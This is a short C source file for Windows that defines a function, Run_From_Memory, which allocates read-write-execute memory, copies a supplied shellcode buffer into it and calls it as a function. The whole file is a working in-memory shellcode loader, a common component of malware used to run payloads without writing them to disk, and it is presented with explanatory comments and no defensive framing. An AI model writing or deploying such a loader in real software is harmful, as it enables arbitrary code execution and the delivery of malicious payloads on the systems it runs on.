#include <windows.h>
#include <string.h> // Required for memcpy

void Run_From_Memory(void *shellcode, int size) {
    if (shellcode == NULL || size <= 0) {
        return; // Invalid input
    }

    // Allocate executable memory
    LPVOID remote_memory = VirtualAlloc(
        NULL,                 // Let the system determine the best location
        size,                 // Size of memory block
        MEM_COMMIT | MEM_RESERVE, // Allocate and reserve memory
        PAGE_EXECUTE_READWRITE // Read, write, and execute permissions
    );

    if (remote_memory == NULL) {
        return; // Memory allocation failed
    }

    // Copy the shellcode into the allocated memory
    memcpy(remote_memory, shellcode, size);

    // Cast the memory address to a function pointer type and execute
    // A common type for shellcode is one that takes no arguments and returns void.
    typedef void (*ShellcodeFunction)();
    ShellcodeFunction func = (ShellcodeFunction)remote_memory;

    // Call the shellcode function
    func();

    // Free the allocated memory if the shellcode returns.
    // Note: Many shellcodes are designed to terminate the process or change execution flow
    // in a way that this line may not be reached. However, for shellcodes that return,
    // this ensures proper resource cleanup.
    VirtualFree(remote_memory, 0, MEM_RELEASE);
}